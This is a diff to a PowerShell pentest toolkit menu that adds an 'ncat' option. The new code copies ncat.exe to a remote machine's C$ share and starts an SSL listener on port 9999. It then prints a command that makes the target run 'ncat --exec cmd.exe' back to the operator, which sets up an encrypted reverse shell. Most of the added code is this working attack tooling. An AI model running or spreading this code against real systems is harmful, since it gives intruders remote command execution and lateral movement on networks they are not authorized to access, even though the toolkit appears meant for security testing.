@@ -35,6 +35,7 @@ Write-Host ""
 Write-Host "     1. InfectionMonkey		| Breach and Attack Simulation tool                        " -ForegroundColor White
 Write-Host "     2. Vulmap(online)		| Find Windows/Linux installed software vulnerabilities    " -ForegroundColor White
 Write-Host "     3. cmdkey      		| Searching for usable domain admin stored credentials     " -ForegroundColor White
+Write-Host "     4. ncat         		| Hacking using ncat (netcat replacement)                  " -ForegroundColor White
 Write-Host ""
 Write-Host "    99. Quit                                                                           " -ForegroundColor White
 Write-Host ""
@@ -176,6 +177,42 @@ switch ($input)
         }
         read-host “Press ENTER to continue”
         $null = start-Process -PassThru explorer $ACQ
+        }
+      #Ncat
+    4 {
+       $ncatPath = scoop prefix ncat
+       $help = @"
+
+        Ncat (netcat)
+        -------------
+        
+        https://nmap.org/ncat/
+
+        networking utility which reads and writes data across networks from the command line,
+        and is integrated with Nmap.
+
+        This script will help you to open an Encrypted reverse cmd shell from a remote computer
+        to the local computer.
+        
+        Tutorials
+        ---------
+        https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/
+
+        Note: You can copy ncat from: $ncat
+"@
+        Write-Host $help
+        $ACQ = ACQ("ncat")
+        $input = Read-Host "Input the destination computer name or IP address to copy ncat to (eg. DC1 or 10.1.1.22)"
+        $targetIP = ((Test-Connection $input -Count 1).IPV4Address).IPAddressToString
+        $localIP = activeIPaddress
+        $ncatPath
+        $input
+        Copy-Item -Path "$ncatPath\ncat.exe" -Destination "\\$targetIP\c$\Temp"
+        Write-Host "Starting ncat on local machine port 9999"
+        Start-Process PowerShell -ArgumentList "ncat -vnl 9999 --allow $targetIP --ssl;read-host 'Press Enter to Exit'" -Verb RunAs
+        Write-Host "Run this command on target [$input]: c:\temp\ncat.exe --exec cmd.exe -vn $localIP 9999 --ssl" 
+        read-host “Press ENTER to exit”
+        #$null = start-Process -PassThru explorer $ACQ
         }
 
     #Menu End
